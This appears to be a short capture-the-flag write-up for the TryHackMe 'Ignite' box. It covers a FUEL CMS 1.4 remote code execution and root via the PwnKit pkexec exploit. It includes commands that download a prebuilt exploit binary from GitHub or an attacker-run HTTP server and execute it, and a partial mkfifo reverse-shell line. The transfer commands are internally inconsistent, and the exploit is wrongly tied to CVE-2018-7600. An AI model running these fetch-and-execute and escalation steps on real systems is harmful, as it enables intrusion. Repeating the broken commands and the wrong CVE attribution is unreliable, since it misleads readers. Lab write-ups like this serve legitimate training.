# THM Ignite

https://tryhackme.com/room/ignite

A Linux box running **FUEL CMS 1.4**, exploited with a public RCE (CVE-2018-7600-era SQLi→RCE chain, ExploitDB 50477) for a `www-data` shell, then rooted with the **PwnKit (pkexec / CVE-2021-4034)** SUID exploit.

## 3. Privilege Escalation — PwnKit (pkexec / CVE-2021-4034)

Transfer tooling to the victim:

> Linpeas: https://github.com/peass-ng/PEASS-ng/releases
> Download "linpeas.sh" to the victim machine:
> ```
> cd /tmp
> python3 -m http.server 80
> curl http://192.168.142.71/PwnKit -o linpeas.sh
> chmod +x PwnKit
> ./PwnKit
> ```
>
> For `/pkexec`: https://github.com/ly4k/PwnKit
>
> It has the SUID binary set. Manually:
> ```
> curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
> chmod +x ./PwnKit
> ./PwnKit # interactive shell
> ./PwnKit 'id' # single command
> ```

## Lessons Learned

- **FUEL CMS advertises its version in the page/footer.** Spotting "FUEL CMS 1.4" led straight to ExploitDB 50477.
- **Prefer a `mkfifo` reverse shell** (`rm /tmp/f;mkfifo /tmp/f;...`) when the first shell is unstable; then upgrade with the `pty.spawn` + `stty raw -echo` ritual.
- **PwnKit (CVE-2021-4034) is a reliable root** on unpatched polkit systems — transfer the prebuilt binary, `chmod +x`, run.
- **Watch your transfer commands.** The notes show the classic copy-paste slip of downloading `PwnKit` but naming it `linpeas.sh` / running the wrong name — re-check filenames before `chmod +x` and execution.
